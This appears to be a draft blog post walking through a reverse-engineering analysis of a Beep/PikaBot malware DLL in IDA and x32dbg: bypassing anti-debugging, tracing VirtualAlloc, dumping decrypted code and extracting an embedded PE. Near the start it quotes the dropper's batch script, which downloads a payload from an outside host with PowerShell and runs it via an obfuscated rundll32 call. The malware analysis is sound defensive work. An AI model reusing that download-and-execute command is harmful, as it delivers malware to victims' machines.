+++
title = "Analyzing Beep Malware [PikaBot]"
draft = true
tags = ["beep-malware","PikaBot"]
categories = ["Malware"]
ShowToc = true
author = ["connar","r4sti"]
+++

## Intro
In continuation from my previous [post]("https://connar.github.io/posts/onenote/"), I will now be analyzing the dropped big.dll. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.

## Analyzing big.dll - Combining IDA and x32dbg
Recall that in our previous post, when the dll was being dropped, a specific exported function was run:
```cmd
@echo off

powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg
call ru%1l32 C:\programdata\big.jpg,DllRegisterServer

exit
```
So, let's open the dll in IDA and view the specific function:  

![](/posts/beepMalware/beep1.png)  

Let's also open the dll in x32dbg and having it side by side with IDA. We can dynamically analyze a malware with x32dbg while also statically comparing it with IDA.

![](/posts/beepMalware/beep2.png)  

The thing is, if we try and run the dll in x32dbg, it will keep exiting due to many anti-debugging checks. We can skip all these and land to DllRegisterServer by just changing the EIP to that part of the code and continue execution from there. Do to so, we need to first find the DllRegisterServer function and then set the EIP there:  

![](/posts/beepMalware/beep3.png)  

Here we used CTRL+G to find the location of the function. After we have landed on the function, just right click-->Set EIP Here:  

![](/posts/beepMalware/beep4.png)  

Since we are using both IDA and x32dbg, it would be a good thing to have the same addresses in both applications. To do so, I got the base address of the PE by going to x32dbg-->Memory Map and copying the address where the .text section starts:  

![](/posts/beepMalware/beep5.png)  

Then, I just navigated to IDA-->Edit-->Segments-->Rebase program... and changed the base address to that of the x32dbg. Now we should have the same addresses and can start our analysis.

## Analyzing big.dll - DllRegisterServer
Viewing the code at first, I did not make a lot of sense as there as many functions that seem to be doing some math operations, possibly a runtime decryption...?  

The thing I knew about malware is that usually there will be a virtual allocation of memory in order for the malware to write and execute code at runtime. So I turned to the imported functions in IDA and found the references on the VirtualAlloc one. This led me to the following part of the code:  

![](/posts/beepMalware/beep6.png)  

We see that a call to VirtualAlloc is happening and right after it a function is called - which is also doing some math operations in a loop. My assumption is that after the allocation of the memory is complete, something is going to be written there, so I got the address of the call to VirtualAlloc and turned back to x32dbg where I put a breakpoint at that part:  

![](/posts/beepMalware/beep7.png)  

Our goal is to get the address that VirtualAlloc will return. This is why at that address something will most likely be written. Something of highly interest!

Running the program, we hit F9 to get to that breakpoint and the execution stops at the call to VirtualAlloc. Then, we just hit F8 to move to the next operation (after the VirtualAlloc is complete) and see that a value is moved from eax to [edi+8C]. Taking a notice at the address stored at eax, we will get the address of the virtually allocated space previously allocated from VirtualAlloc:  

![](/posts/beepMalware/beep8.png)  

A good trick that r4sti taught me is to put a hardware write breakpoint at the first byte of the memory allocated space . This is done in order to stop execution at that part when something is written to it. So basically we found the memory allocated space and now we are going to find out what will be written to it:  

![](/posts/beepMalware/beep9.png)  

After our hardware write bp is set, let's press F9 and see where the code execution went:  

![](/posts/beepMalware/beep10.png)  

We see our first byte has been written - please ignore the difference address between the images. It's cause of ASLR and the fact that I was reloading the sample while writting this post.  Now, to get the fully written bytes, let's remove the breakpoint and then place it again at the same position. This is because, when all bytes are written to the allocated space, most likely a call to that address will happen as it will contain some short of code:  

![](/posts/beepMalware/beep11.png)  

After the allocated space is fully written, we see the execution stopped at the function sub_70761000:  

![](/posts/beepMalware/beep12.png)  

Having the fully written bytes, we cannot make anything of it. They seem encrypted.  

Exploring the function that the execution stopped, we notice that there is code execution since a stdcall is taking place:  

![](/posts/beepMalware/beep13.png)  

So since the execution stopped at that function based on the breakpoint set at the vallocated space, some use of these bytes is taking place. Let's remove once again the breakpoint and replace it at the same byte and see what happens:  

![](/posts/beepMalware/beep14.png)  

The code has stopped on the call eax were it will execute the bytes written in the allocated space. What we notice is that the bytes have now changed. We can also spot an executable written inside that memory allocated space:  

![](/posts/beepMalware/beep15.png)  

Since its a stdcall on bytes, its probably decrypted assembly code, so let's proceed by dumping the memory to a file and analyzing it further. We will also separately get the PE file found inside the decrypted code.

### Dumping the code - Decrypted assembly
To dump the fully decrypted code, we must click on the first byte and follow it in the memory map:  

![](/posts/beepMalware/beep16.png)  

Then simply right click on the memory address and use "Dump Memory to File".

Opening the dumped file in IDA, we see the following code:  

![](/posts/beepMalware/beep17.png)  

Yet another call to something is being made. If we load this in x32dbg and breakpoint at that address, we will see it executes the PE file previously found embedded in the decrypted assembly code. So for the sake of simplicity, let's analyze it straight ahead (as we already saw how we would do that).

### Dumping the code - PE file inside decrypted assembly
The way I got the PE file was by using the pecheck.py tool by Steven Didier which basically identifies and extracts PE files embedded in other filetypes. The command I used is:  
```
python pecheck.py -l 1 -g s -D dumped_decrypted_assembly.bin > embedded_pe.dll
```
We can get a general idea of this dll by loading it to VT which will notify us how malicious it is:  

![](/posts/beepMalware/beep18.png)  






**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.bleepingcomputer.com/news/security/new-stealthy-beep-malware-focuses-heavily-on-evading-detection/">Bill Toulas: New stealthy 'Beep' malware focuses heavily on evading detection</i></a></li>
        <li> [2] <a href="https://www.swascan.com/beep-analisi-malware/">swascan: <i>Beep Malware: static and dynamic analysis</i></a></li>
        <li> [2] <a href="https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html">OALABS: <i>PikaBot</i></a></li>
</i></a></li>
    </ul>
</blockquote>